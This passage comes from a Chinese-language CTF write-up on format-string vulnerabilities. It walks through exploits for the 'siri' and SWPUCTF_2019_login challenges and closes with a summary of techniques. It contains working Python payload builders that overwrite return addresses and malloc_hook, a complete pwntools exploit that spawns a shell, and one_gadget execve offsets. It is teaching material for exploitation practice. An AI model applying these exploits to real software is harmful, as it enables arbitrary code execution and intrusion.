    io.interactive()
修改栈链后栈空间如下
考察这个知识点的题目还有ciscn2020华南分赛区same和MidnightsunCTF Quals 2020 pwn4，就不多说了
再氵两道题吧，首先是一道强网杯的Siri
## 0x5.强网杯 siri
检查保护
IDA分析
再sub_1212函数中存在格式化字符串漏洞
这题和上面的题目比起来很简单了，主要是讲一下构造payload
格式化字符串在栈上，直接改返回地址或者malloc_hook为onegadget就行
首先泄露libc和stack地址
泄露这两个地方的值得到栈地址和libc地址，函数的返回地址为rbp下方的那个值，所以返回地址为泄露的栈地址-0x118
我们输入的值在这个地方
得到对应的偏移为%49
首先来试第一种方法，修改返回地址
根据格式化字符串修改内存的用法：%Xc%Y$hn(hhn)，其中X为要写入的字节数，Y为偏移量。在64位格式化字符串漏洞利用中，要写入的地址一般都是放在最后面，所以Y要根据要写入地址的偏移量来设置。而写字节一次性可以写4字节，2字节和1字节，一般选用一次写入2字节和1字节的，一次写入4字节的话要返回值太多，本地可以勉强接受，远程肯定会崩掉。
先来讲下一次性写入两字节的payload的是如何构造的。首先返回地址为6字节长，因为onegadget和返回地址的值所有字节都不相同，所以需要全部修改，-一次改2字节共需要修改3次，这样就有8*3=0x18字节的长度，三个返回地址一次放在payload的最后面。printf函数除了用户输入的数据还会在前面输出`>>>
OK, I'll remind you to` ，长度为27，所以在构造pyload的过程中需要减27，还有用户输入的数据是和`Remind me to`
拼接在一起的，长度为13，最后payload对齐的时候需要-13再对齐。payload构造如下：
    write_size=0
    offset=55 #offset根据payload对齐的字节来决定
    payload=''
    for i in range(3):#一共三次，每次修改两字节
      num=(onegadget>>(16*i))&0xffff#每次将onegadget右移两字节
      num-=27#>>> OK, I'll remind you to 的长度为27
      if num>write_size&0xffff:#如果这一次要写入的字节数大于已经写入的字节数，只需要写入num和write_size之差的字节数即可，因为
        payload+='%{}c%{}$hn'.format(num-(write_size&0xffff),offset+i)#前面已经写入了write_size个字节，再加上差值就能
        write_size+=num-(write_size&0xffff)                            #写入num个字节了
      else:#如果本次要写入的字节数小于已经写入的字节数，那么我们是不能直接写入num个字节的，可以理解为溢出了，比如已经写入了0xffff个字节，而本次要写入0xeeee个字节，”超额“写入了，这个时候就需要写入负数，四字节的最大值为0xffff，可以理解为0x10000为0，0-0xffff得到一个负数-0xffff，然后再加上0xeeee得到差值-0x1111。
        payload+='%{}c%{}$hn'.format((0x10000-(write_size&0xffff))+num,offset+i)
        write_size+=0x10000-(write_size&0xffff)+num
    payload=payload.ljust(0x38-13,'a')#八字节对齐
    for i in range(3):
      payload+=p64(rip+i*2)#将存储着返回地址的栈地址放到payload的最末尾，每次加2
生成好的payload在printf栈中
printf函数执行后
返回地址已经被修改
再来看看一次修改一字节的payload生成，实际上就是把0x10000改成0x100，$hn改成$hhn，payload对齐字节要更多以及偏移量要变化
    write_size=0
    offset=60
    payload=''
    for i in range(6):
      num=(onegadget>>(8*i))&0xff
      num-=27
      if num>write_size&0xff:
        payload+='%{}c%{}$hhn'.format(num-(write_size&0xff),offset+i)
        write_size+=num-(write_size&0xff)
      else:
        payload+='%{}c%{}$hhn'.format((0x100-(write_size&0xff))+num,offset+i)
        write_size+=(0x100-(write_size&0xff))+num
    payload=payload.ljust(0x60-13,'a')
    for i in range(6):
      payload+=p64(rip+i)
此时的payload在栈空间中
修改完后
改malloc_hook和改返回地址是一样的，只需要把最后的地址换成malloc_hook的地址就行
还有一种方法就是修改main函数的返回地址
但因为main函数在while死循环里，所以我们还需要使main函数跳出循环
在IDA的graph view界面里我们可以看到代码块都走向了同一处
然后又会回到main函数开头，所以我们需要利用格式化字符串修改程序不跳转到这里，而是直接结束main函数
在执行完格式化字符串所在的函数后，执行的下一条指令如下
在栈中是返回地址
我们将返回地址的最后两位修改为leave ret的后两位，使其跳转到leave ret
所以一共分两步，第一步修改main函数返回地址为onegadget，第二步修改printf函数返回地址为leave ret
    for i in range(6):
      num=(onegadget>>(8*i))&0xff
      num-=27
      if num>write_size&0xff:
        payload+='%{0}c%{1}$hhn'.format(num-(write_size&0xff),offset+i)
        write_size+=num-(write_size&0xff)
      else:
        payload+='%{0}c%{1}$hhn'.format((0x100-(write_size&0xff))+num,offset+i)
        write_size+=(0x100-(write_size&0xff))+num
    payload=payload.ljust(0x60-13,'a')
    for i in range(6):
      payload+=p64(main_ret+i)
    siri(payload)
    siri('aaaa')
    payload='%'+str(0xc1-27)+'c%61$hhn'
    payload=payload.ljust(0x5f-13,'a')
    payload+=p64(rip)
    siri(payload)
第一次printf后main函数返回地址已经修改为了onegadget
第二次printf后pintf函数返回地址被修改成功
直接返回执行onegadget
## 0x6.SWPUCTF_2019_login
检查保护
got表可改
IDA分析
存在格式化字符串漏洞，不过格式化字符串在bss段上，最多能输入0x32个字节
因为输入wllmmllw能够退出程序，所以考虑修改main函数的返回地址为onegadget
通过%6$p和%15$p泄露栈地址和libc地址
然后修改005c处的栈链指向main函数的返回地址，也就是0050处
修改之前
修改之后
然后就可以修改mian函数的返回地址了，onegadget和返回地址有三个字节不同，所以需要先修改两字节，然后再将栈链+2，继续修改剩下的一字节
exp如下：
    from pwn import *
    context.log_level = 'debug'
    io = process("./SWPUCTF_2019_login")
    libc=ELF('./libc-2.27_x86.so')
    io.sendlineafter("name: ", 'a')
    payload = '%6$p-%15$p'
    io.sendlineafter("password: ", payload)
    io.recvuntil("0x")
    ret_addr = int(io.recv(8), 16)+36
    io.recvuntil("0x")
    libc_base = int(io.recv(8), 16)-libc.symbols['__libc_start_main']-241
    onegadget=libc_base+0x3d0e0
    log.success('ret_addr => {}'.format(hex(ret_addr)))
    log.success('libc_base => {}'.format(hex(libc_base)))
    log.success('onegadget => {}'.format(hex(onegadget)))
    payload='%'+str(ret_addr&0xffff)+'c%22$hn'
    #gdb.attach(io)
    io.sendlineafter("Try again!\n", payload)
    payload='%'+str(onegadget&0xffff)+'c%59$hn'
    io.sendlineafter("Try again!\n", payload)
    payload='%'+str((ret_addr+2)&0xff)+'c%22$hhn'
    io.sendlineafter("Try again!\n", payload)
    payload='%'+str((onegadget>>16)&0xffff)+'c%59$hhn'
    io.sendlineafter("Try again!\n", payload)
    io.sendlineafter("Try again!\n", 'wllmmllw')
    io.interactive()
    '''
    0x3d0d3 execve("/bin/sh", esp+0x34, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x34] == NULL
    0x3d0d5 execve("/bin/sh", esp+0x38, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x38] == NULL
    0x3d0d9 execve("/bin/sh", esp+0x3c, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x3c] == NULL
    0x3d0e0 execve("/bin/sh", esp+0x40, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x40] == NULL
    0x67a7f execl("/bin/sh", eax)
    constraints:
      esi is the GOT address of libc
      eax == NULL
    0x67a80 execl("/bin/sh", [esp])
    constraints:
      esi is the GOT address of libc
      [esp] == NULL
    0x137e5e execl("/bin/sh", eax)
    constraints:
      ebx is the GOT address of libc
      eax == NULL
    0x137e5f execl("/bin/sh", [esp])
    constraints:
      ebx is the GOT address of libc
      [esp] == NULL
    '''
## 0x7.总结
总的来说，栈上的格式化字符串漏洞，可以直接写地址修改，缓冲区长度够的话就一次写一字节，长度不够就一次两字节写；bss段的格式化字符串，需要在栈中找栈链，栈0->栈1->栈2->值，然后修改栈2指向printf函数的返回地址或者main函数的地址，然后就可以修改返回地址为onegadget了；还有堆中的格式化字符串，实际上和bss段的没有区别，也是改栈链；如果程序只有有限次printf机会，如果有fini_array的真实地址，就可以修改fini_array中的值为mian函数的地址，以此来重复利用；标准输出流stdout被关闭了依然可以写数据，只不过没有回显了，想要重新输出的话可以将stdout结构体的fileno成员设置为2或者0，也可以通过修改stderr的值为onegadget来getshell。